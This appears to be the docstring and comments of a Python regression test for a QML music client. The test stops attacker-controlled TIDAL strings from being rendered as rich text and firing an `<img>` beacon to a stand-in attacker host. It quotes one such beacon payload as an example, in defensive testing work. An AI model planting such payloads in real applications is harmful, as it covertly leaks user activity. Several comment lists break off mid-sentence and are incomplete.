"""Regression guard: a zero-click image-beacon must never re-appear in the QML.

THE BUG WE ARE FENCING OFF
--------------------------
Qt's ``Text``/``Label`` default to ``textFormat: Text.AutoText``. AutoText sniffs
the bound string and, if it looks like HTML, parses it as *rich text*, at which
point an embedded ``<img src="https://attacker/beacon?id=...">`` is fetched the
instant the label paints. For a string an attacker controls (anything TIDAL serves
us: album/track/artist names, bios, durations, playlist titles, queue labels) that
is a zero-click outbound beacon leaking "this user viewed this item".

``StyledText`` and ``RichText`` parse HTML the same way; only ``PlainText`` is safe.

HOW THIS STAYS FIXED
--------------------
A denylist of "which bindings are remote" is fragile; an adversarial review showed
it leaks via bare component props, bracket access (``model['x']``), local aliases,
and ``RichText``. So the guard is STRUCTURAL, with ZERO false negatives by design:

* ``test_dynamic_text_is_plaintext``: in Main.qml (the TIDAL render surface) EVERY
  ``Text``/``Label`` whose ``text:`` is a *dynamic* (non-literal) expression must be
  ``PlainText`` (or a ``RemoteText``, or an audited rich-text spot). No
  remote-vs-local guess, so a brand-new remote binding can't beacon however it is
  bound. Pure string/char literals are exempt: they can't carry a remote string.
* ``test_richtext_is_only_the_deliberate_local_spots``: the StyledText/RichText set
  must equal exactly the audited ``DELIBERATE_RICHTEXT`` spots (all bind LOCAL data),
  closing the other two rich-text paths.
* ``RemoteText.qml`` is the ergonomic shared default for new remote strings; its own
  test pins ``PlainText``. The ``REMOTE_MARKERS`` below are now used only to flag a
  deliberate rich-text spot that *starts* binding remote data.

See ``ALGORITHM`` below for the exact detection rules.

#                    attacker-controllable → remote.
#   DownloadButton.qml  the download control and its Chooser (split out of
#                    Main.qml, #315 slice 2): `db.label` carries a remote artist
#                    name and the provider tiles carry bridge descriptor names.
#   Art.qml          the VideoCell closure (split out of Main.qml, #315 slice 3):

#   VideoCell.qml    artist, date and spec, ArtistLinks renders remote artist
#   ArtistLinks.qml  names (and marks them), so all six ride the TIDAL set even
#   ExplicitMark.qml where the element is local chrome today.
#   BackToTop.qml    components split out of Main.qml (#315). They render local
#   DotMatrix.qml    chrome only, so no remote marker matches today; they ride
#   SnakeField.qml   the TIDAL set anyway so the STRUCTURAL PlainText rule
#   HoverSwell.qml   (`test_dynamic_text_is_plaintext`) scans their Text elements,
#   QueueStack.qml   and a future binding there cannot go unchecked.

#   SettingsPage.qml renders only LOCAL data: the app's own settings schema
#                    (`modelData.label/.group/.desc/.help/.fields`, defined in our
#                    Python, never from TIDAL) and our own ffmpeg/updater status.
#                    So `model.`/`modelData.` there are NOT remote. It is still
#                    scanned so its deliberate StyledText spots stay deliberate and
#                    can't quietly start binding a TIDAL string.

#   NewTag.qml       TrackPresencePill/StandalonePair/ProviderBadge are local
#   PopMeter.qml     chrome that ride the set for the same structural reason as

# ===========================================================================
# ALGORITHM (prose)
# ---------------------------------------------------------------------------
# 1. ENUMERATE ELEMENTS. For each .qml file, find every element-open token:
#       (optional `contentItem:`/`delegate:` prefix is irrelevant: we just match
#        the type name) `Text {` or `Label {`, via a regex whose leading negative
#       lookbehind `(?<![A-Za-z0-9_.])` rejects `TextField`, `TextInput`,
#       `TextMetrics`, `TextArea`, and `Foo.Text` enum reads. `RemoteText {` is
#       matched separately and treated as INHERENTLY SAFE (it bakes in PlainText),
#       so it is never flagged.
#
# 2. CAPTURE THE BRACE SPAN. From each open `{`, walk forward counting `{`/`}`
#    depth (skipping string literals and // and /* */ comments) until depth returns
#    to 0. That `{...}` is the exact source of THAT element: inline one-liners,
#    multi-line bodies, and nested child braces alike, with no greedy over-capture.
#
# 3. EXTRACT THE ELEMENT'S OWN `text:` VALUE. Scan the span for a `text:` that is a
#    *direct* property of this element (at brace-depth 1 inside the body; never one
#    belonging to a nested child `{...}` or a `function(){}`). The value runs from
#    just after the colon to the matching terminator:
#       * if the value itself opens `{` (a multi-line JS block, e.g. the
#         queue-progress label at Main.qml:2133-2141) capture the whole
#         brace-balanced block;
#       * otherwise capture to the end of the logical statement (`;`, newline, or
#         the element's closing `}`) while respecting (), [], {} and string nesting
#         so a `;`/newline inside a string or argument list never truncates it.
#    If the element has NO own `text:` (e.g. a glyph button `text: "✕"` whose only
#    `model.qid` reference lives in a child `MouseArea.onClicked`), it is NOT
#    remote-bound. Scoping to the `text:` VALUE (not the whole block) is what
#    avoids that false positive.
#
# 4. CLASSIFY remote := (file is a TIDAL_DATA_FILE) AND (a REMOTE_MARKER matches the
#    extracted `text:` value). The marker matches the remote ROOT object, so a new
#    `model.<anything>` field is caught even though we never enumerated it.
#
# 5. CLASSIFY safe := the element span contains `textFormat: Text.PlainText`. This
#    works for both the inline form (`Text { textFormat: Text.PlainText; text: … }`)
#    and the multi-line form where `textFormat` sits on its own line either before
#    or after `text:` (we search the whole span, so order/placement is irrelevant;
#    e.g. the queue label at Main.qml:2132 declares PlainText one line ABOVE its
#    multi-line `text:` block, and the bio at 1732 declares it BELOW). RemoteText
#    elements are safe by construction (step 1).
#
# 6. ASSERT every dynamic element is safe, unless it carries a
#    `guard:deliberate-richtext <slug>` marker (open line or the line directly
#    above) whose (file, slug) is in DELIBERATE_RICHTEXT. Content-anchored, so
#    edits elsewhere in the file can't invalidate the audit (line-number keys
#    needed manual re-pinning after almost every edit above them).
#
# 7. FALSE-NEGATIVE BACKSTOP (separate test). Independently assert that the set of
#    StyledText/RichText elements is EXACTLY the marked-and-listed audited set
#    (an unmarked rich-text element fails, a marker missing from the allowlist
#    fails, an allowlisted slug with no rich-text element fails) and that none of
#    those deliberate spots has started binding a remote marker. So the moment
#    anyone adds a new `textFormat: Text.StyledText` (the only other way to get
#    rich text / auto-`<img>`) the guard fails until it is reviewed, marked and
#    listed. A third test polices the markers themselves (unique per file, always
#    attached to a Text/Label open, always listed). Combined with step 6 (which
#    forbids leaving a remote string on the AutoText default), the tests together
#    close every path to rendering attacker HTML.
